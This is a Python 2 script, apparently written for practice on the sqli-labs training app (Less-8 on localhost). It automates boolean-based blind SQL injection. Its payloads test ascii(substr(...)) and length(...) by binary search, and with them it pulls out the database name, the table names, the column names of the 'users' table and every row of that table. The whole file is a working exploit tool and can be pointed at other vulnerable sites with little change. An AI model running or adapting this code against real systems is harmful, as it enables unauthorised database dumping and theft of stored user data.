#!usr/bin/python
# -*- coding:utf-8 -*-

__Author__='moxiaoxi'
__Filename__='blindsqlinjextion.py'


import urllib2
import urllib


success_str = "You are in"
getTable = "users"

index = "0"
url = "http://localhost:8888/sqli-labs/Less-8/?id=1"
database = "database()"
selectDB = "select database()" 
selectTable = "select table_name from information_schema.tables where table_schema='%s' limit %d,1"


asciiPayload = "' and ascii(substr((%s),%d,1))>=%d #"
lengthPayload = "' and length(%s)>=%d #"
selectTableCountPayload = "'and (select count(table_name) from information_schema.tables where table_schema='%s')>=%d #"

selectTableNameLengthPayloadfront = "'and (select length(table_name) from information_schema.tables where table_schema='%s' limit " 
selectTableNameLengthPayloadbehind = ",1)>=%d #"


# 发送请求，根据页面的返回的内容或者判断长度(未实现）的猜测结果
# string:猜测的字符串 payload:使用的payload  length：猜测的长度
def getLengthResult(payload, string, length):
    finalUrl = url + urllib.quote(payload % (string, length))
    res = urllib2.urlopen(finalUrl)
    if success_str in res.read():
        return True
    else:
        return False

# 发送请求，根据页面的返回的判断猜测的字符是否正确
# payload:使用的payload    string:猜测的字符串   pos：猜测字符串的位置    ascii：猜测的ascii
def getResult(payload, string, pos, ascii):
    finalUrl = url + urllib.quote(payload % (string, pos, ascii))
    res = urllib2.urlopen(finalUrl)
    if success_str in res.read():
        return True
    else:
        return False


    
# 获取字符串的长度          
def getLengthOfString(payload, string):
    # 猜长度
    lengthLeft = 0
    lengthRigth = 0
    guess = 10
    # 确定长度上限，每次增加5
    while 1:
        # 如果长度大于guess
        if getLengthResult(payload, string, guess) == True:
            # 猜测值增加5
            guess = guess + 5   
        else:
            lengthRigth = guess
            break
    # print "lengthRigth: " + str(lengthRigth)
    # 二分法查长度
    mid = (lengthLeft + lengthRigth) / 2
    while lengthLeft < lengthRigth - 1:
        # 如果长度大于等于mid 
        if getLengthResult(payload, string, mid) == True:
            # 更新长度的左边界为mid
            lengthLeft = mid
        else: 
        # 否则就是长度小于mid
            # 更新长度的右边界为mid
            lengthRigth = mid
        # 更新中值
        mid = (lengthLeft + lengthRigth) / 2        
        # print lengthLeft, lengthRigth
    # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid
    # 所以长度区间：大于等于 lengthLeft，小于lengthRigth
    # 而循环条件是 lengthLeft < lengthRigth - 1，退出循环，lengthLeft就是所求长度
    # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8<=length<9,length就肯定等于8
    return lengthLeft

# 获取名称
def getName(payload, string, lengthOfString):
    # 32是空格，是第一个可显示的字符，127是delete，最后一个字符
    tmp = ''
    for i in xrange(1,lengthOfString+1):
        left = 32 
        right = 127
        mid = (left + right) / 2
        while left < right - 1:
            # 如果该字符串的第i个字符的ascii码大于等于mid
            if getResult(payload, string, i, mid) == True:
                # 则更新左边界
                left = mid
                mid = (left + right) / 2
            else:
            # 否则该字符串的第i个字符的ascii码小于mid
                # 则更新右边界
                right = mid
            # 更新中值
            mid = (left + right) / 2
        tmp += chr(left)
        # print tmp
    return tmp  
        
        
# 注入
def inject():
    # 猜数据库长度
    lengthOfDBName = getLengthOfString(lengthPayload, database)
    print "length of DBname: " + str(lengthOfDBName)
    # 获取数据库名称
    DBname = getName(asciiPayload, selectDB, lengthOfDBName)
    
    print "current database:" + DBname

    # 获取数据库中的表的个数
    # print selectTableCountPayload
    tableCount = getLengthOfString(selectTableCountPayload, DBname)
    print "count of talbe:" + str(tableCount)

    # 获取数据库中的表
    for i in xrange(0,tableCount):
        # 第几个表
        num = str(i)
        # 获取当前这个表的长度
        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind
        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)
        print "current table length:" + str(tableNameLength)
        # 获取当前这个表的名字
        selectTableName = selectTable%(DBname, i)
        tableName = getName(asciiPayload, selectTableName ,tableNameLength)
        print tableName


    selectColumnCountPayload = "'and (select count(column_name) from information_schema.columns where table_schema='"+ DBname +"' and table_name='%s')>=%d #"
    # print selectColumnCountPayload
    # 获取指定表的列的数量
    columnCount = getLengthOfString(selectColumnCountPayload, getTable)
    print "table:" + getTable + " --count of column:" + str(columnCount)

    # 获取该表有多少行数据
    dataCountPayload = "'and (select count(*) from %s)>=%d #"
    dataCount = getLengthOfString(dataCountPayload, getTable)
    print "table:" + getTable + " --count of data: " + str(dataCount)

    data = []
    # 获取指定表中的列
    for i in xrange(0,columnCount):
        # 获取该列名字长度
        selectColumnNameLengthPayload = "'and (select length(column_name) from information_schema.columns where table_schema='"+ DBname +"' and table_name='%s' limit "+ str(i) +",1)>=%d #"
        # print selectColumnNameLengthPayload
        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)
        print "current column length:" + str(columnNameLength)
        # 获取该列的名字
        selectColumn = "select column_name from information_schema.columns where table_schema='"+ DBname +"' and table_name='%s' limit %d,1"
        selectColumnName = selectColumn%(getTable, i)
        # print selectColumnName
        columnName = getName(asciiPayload, selectColumnName ,columnNameLength)
        print columnName

        tmpData = []
        tmpData.append(columnName)
        # 获取该表的数据
        for j in xrange(0,dataCount):
            columnDataLengthPayload = "'and (select length("+ columnName +") from %s limit " + str(j) + ",1)>=%d #"
            # print columnDataLengthPayload
            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)
            # print columnDataLength
            selectData = "select " + columnName + " from users limit " + str(j) + ",1"
            columnData = getName(asciiPayload, selectData, columnDataLength)
            # print columnData
            tmpData.append(columnData)
    
        data.append(tmpData)

    # print data    
    # 格式化输出数据
    # 输出列名
    tmp = ""
    for i in xrange(0,len(data)):
        tmp += data[i][0] + "   "
    print tmp
    # 输出具体数据
    for j in xrange(1,dataCount+1):
        tmp = ""
        for i in xrange(0,len(data)):
            tmp += data[i][j] + "   "
        print tmp


def main():
    inject()

main()
